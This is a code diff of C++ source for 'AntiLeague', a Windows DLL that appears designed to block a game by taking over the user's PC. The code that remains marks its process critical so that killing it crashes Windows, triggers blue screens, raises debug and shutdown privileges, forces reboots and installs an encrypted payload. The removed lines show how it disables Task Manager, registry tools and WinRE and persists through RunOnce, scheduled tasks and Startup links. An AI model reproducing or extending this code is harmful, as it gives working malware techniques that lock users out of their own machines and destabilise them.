@@ -1,10 +1,6 @@
-﻿#include "Install.h"
+﻿#include "stdafx.h"
+#include "Install.h"
 #include "payload.h"
-#include <comdef.h>
-#include <taskschd.h>
-#include <ShlObj_core.h>
-
-bool isFirstInstance = false;
 
 void BSOD()
 {
@@ -41,97 +37,14 @@ BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
     return TRUE;
 }
 
-void Uninstall()
-{
-#ifdef DisableWinRE
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    ZeroMemory(&si, sizeof(si));
-    ZeroMemory(&pi, sizeof(pi));
-
-    wchar_t args[17] = L"reagentc /enable";
-    if (CreateProcess(NULL, args, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-#endif
-
-#if defined(DisableTaskMGR) || defined(DisableRegistry) || defined(RunOnceRegistry)
-    HKEY hkey;
-#endif
-
-#ifdef DisableTaskMGR
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
-    {
-        DWORD value = NULL;
-        RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
-        RegCloseKey(hkey);
-    }
-#endif
-
-#ifdef DisableRegistry
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
-    {
-        DWORD value = NULL;
-        RegSetValueEx(hkey, L"DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
-        RegCloseKey(hkey);
-    }
-#endif
-
-#ifdef RunOnceRegistry
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", NULL, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
-    {
-        RegDeleteValue(hkey, L"*AntiLeague");
-        RegCloseKey(hkey);
-    }
-#endif
-
-#ifdef TaskSchedulerStartup
-    CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
-
-    ITaskService* pService = NULL;
-    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
-
-    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
-
-    ITaskFolder* pRootFolder = NULL;
-    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
-    pService->Release();
-
-    pRootFolder->DeleteTask(_bstr_t(L"AntiLeague"), NULL);
-    pRootFolder->Release();
-    CoUninitialize();
-#endif
-
-#ifdef StartupFile
-    wchar_t _startup[MAX_PATH];
-    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, _startup);
-
-    if (_startup[0] == NULL)
-    {
-        MessageBox(NULL, L"Failed to retreive startup path.", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-        std::exit(1);
-    }
-
-    std::wstring _linkFile = _startup;
-    _linkFile += L"\\AntiLeague.lnk";
-
-    _wunlink(_linkFile.c_str());
-#endif
-}
-
 extern "C"
 {
-    PAYLOAD_API void DisableCritical()
+    void DisableCritical()
     {
         RtlSetProcessIsCritical(FALSE, NULL, FALSE);
     }
 
-    PAYLOAD_API bool AntiLeague()
+    bool AntiLeague()
     {
         CoInitializeEx(NULL, COINIT_MULTITHREADED);
         CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
@@ -539,43 +452,48 @@ extern "C"
                 CoUninitialize();
                 BSOD();
 
-                std::exit(0);
+                exit(0);
             }
 
             Sleep(1000);
             continue;
         }
 
+        /*
+            Unreachable
+        */
+
         CoUninitialize();
         return true;
     }
 
-    PAYLOAD_API void Init(std::string* _payload, std::string* payload, const std::string& dec_key)
+    void Init(const std::string& payloadPath, const std::string& payload, const std::string& dec_key)
     {
-        wchar_t _desktop[MAX_PATH];
-        SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, _desktop);
+        wchar_t desktop[MAX_PATH];
+        SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, desktop);
 
-        if (_desktop[0] == NULL)
+        if (desktop[0] == NULL)
         {
             BSOD();
-            std::exit(1);
+            exit(1);
         }
 
-        std::wstring _uninstall = _desktop;
-        _uninstall += L"\\N6BixkdcE4";
+        std::wstring uninstall = desktop;
+        uninstall += L"\\";
+        uninstall += uninstallCode;
 
-        if (_waccess_s(_uninstall.c_str(), 0) == 0)
+        if (_waccess_s(uninstall.c_str(), 0) == 0)
         {
             switch (MessageBox(NULL, L"Are you sure you want to remove AntiLeague?", L"Uninstaller", MB_YESNO))
             {
             case IDYES:
-                Uninstall();
+                Installer::Uninstall();
                 wchar_t szExeFileName[MAX_PATH];
                 GetModuleFileName(NULL, szExeFileName, MAX_PATH);
 
                 MoveFileEx(szExeFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-                MoveFileExA(_payload->c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-                _wunlink(_uninstall.c_str());
+                MoveFileExA(payloadPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+                _wunlink(uninstall.c_str());
 
                 MessageBox(NULL, L"AntiLeague has been successfully uninstalled.", L"Uninstaller", MB_OK);
                 MessageBox(NULL, L"Your PC will now restart to delete all files associated with this AntiLeague install.", L"Uninstaller", MB_OK);
@@ -583,8 +501,9 @@ extern "C"
                 SetPrivilege(L"SeShutdownPrivilege", TRUE);
                 ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_INSTALLATION | SHTDN_REASON_FLAG_PLANNED);
 
-                std::exit(0);
+                exit(0);
                 break;
+
             case IDNO:
                 MessageBox(NULL, L"Thank you for staying!", L"AntiLeague", NULL);
                 break;
@@ -594,25 +513,10 @@ extern "C"
         SetPrivilege(L"SeDebugPrivilege", TRUE);
         RtlSetProcessIsCritical(TRUE, NULL, FALSE);
 
-        c_Install Installer(payload, dec_key);
+        Installer Installer(payload, dec_key);
         Installer.Install();
         isFirstInstance = true;
     }
-
-    PAYLOAD_API void QuickInstall(std::string* payload, const std::string& dec_key)
-    {
-        c_Install Installer(payload, dec_key);
-        Installer.Install();
-
-        if (!isFirstInstance)
-        {
-            BSOD();
-            std::exit(1);
-        }
-        else
-            isFirstInstance = false;
-    }
-
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
